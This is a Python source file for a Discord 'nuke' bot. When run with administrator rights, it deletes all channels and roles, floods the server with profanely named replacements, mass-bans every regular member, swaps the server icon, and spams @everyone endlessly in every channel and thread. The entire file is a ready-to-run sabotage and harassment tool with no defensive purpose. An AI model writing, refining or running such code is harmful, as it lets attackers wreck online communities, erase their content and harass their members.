import discord
from discord.ext import commands
import asyncio
import random
import logging
import os

intents = discord.Intents.all()
intents.members = True
intents.message_content = True
intents.presences = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(message)s')

TOKEN = os.getenv("TOKEN")

if not TOKEN:
    print("ERROR: TOKEN environment variable not set!")
    exit(1)

@bot.event
async def on_ready():
    print(f"[{bot.user}] Kieran Ultra Nuke Bot Online")
    await bot.change_presence(activity=discord.Game(name="Kieran Nuke"))

async def set_kieran_icon(guild):
    try:
        with open("kieran_icon.jpg", "rb") as f:
            await guild.edit(icon=f.read(), reason="Kieran Nuke")
        logging.info("Icon set")
    except Exception as e:
        logging.error(f"Icon failed: {e}")

async def safe_delete(obj):
    try:
        await obj.delete()
    except:
        pass

async def safe_ban(member):
    try:
        await member.ban(reason="Nuke by Kieran", delete_message_days=1)
    except:
        pass

# Infinite spam task
async def infinite_spam_task(channel, text):
    count = 0
    while True:
        try:
            await channel.send(f"@everyone {text}")
            count += 1
            if count % 20 == 0:
                logging.info(f"Spammed {count} messages in {channel.name}")
            await asyncio.sleep(0.4)
        except:
            await asyncio.sleep(1)  # Back off if rate limited

@bot.command()
@commands.has_permissions(administrator=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    logging.info("Deleting all channels...")
    for ch in list(guild.channels):
        await safe_delete(ch)
    logging.info("Creating new channels...")
    for i in range(50):
        try:
            cat = await guild.create_category(f"fucked-by-kieran")
            await guild.create_text_channel("fucked-by-kieran", category=cat)
        except:
            pass
    logging.info("Channels done")

@bot.command()
@commands.has_permissions(administrator=True)
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    logging.info("Starting mass ban...")
    members = list(guild.members)
    random.shuffle(members)
    for member in members:
        if member != guild.owner and member != bot.user and not member.bot:
            await safe_ban(member)
    logging.info("Ban done")

@bot.command()
@commands.has_permissions(administrator=True)
async def roles(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    logging.info("Deleting roles...")
    for role in reversed(list(guild.roles)):
        if role != guild.default_role and role != guild.me.top_role:
            await safe_delete(role)
    logging.info("Creating new roles...")
    for _ in range(100):
        try:
            await guild.create_role(name="fucked by Kieran", colour=discord.Colour.random())
        except:
            pass
    logging.info("Roles done")

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx, *, text: str = "fucked by Kieran - Protocol Zero"):
    await ctx.message.delete()
    guild = ctx.guild
    logging.info("Starting INFINITE spam in every channel")
    
    channels_to_spam = guild.text_channels + [thread for thread in guild.threads]
    tasks = [infinite_spam_task(channel, text) for channel in channels_to_spam]
    await asyncio.gather(*tasks, return_exceptions=True)

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.send("🚀 **KIERAN FULL NUKE PROTOCOL ACTIVATED**")
    guild = ctx.guild
    
    await set_kieran_icon(guild)
    
    logging.info("Starting full nuke sequence...")
    
    # Run core destructive actions in parallel
    await asyncio.gather(
        roles(ctx),
        channels(ctx),
        ban(ctx),
        return_exceptions=True
    )
    
    # Start infinite spam
    await spam(ctx)
    
    await ctx.send("@everyone **SERVER FUCKED BY KIERAN - INFINITE SPAM ACTIVE**")
    logging.info("FULL NUKE COMPLETE - INFINITE SPAM RUNNING")

bot.run(TOKEN)
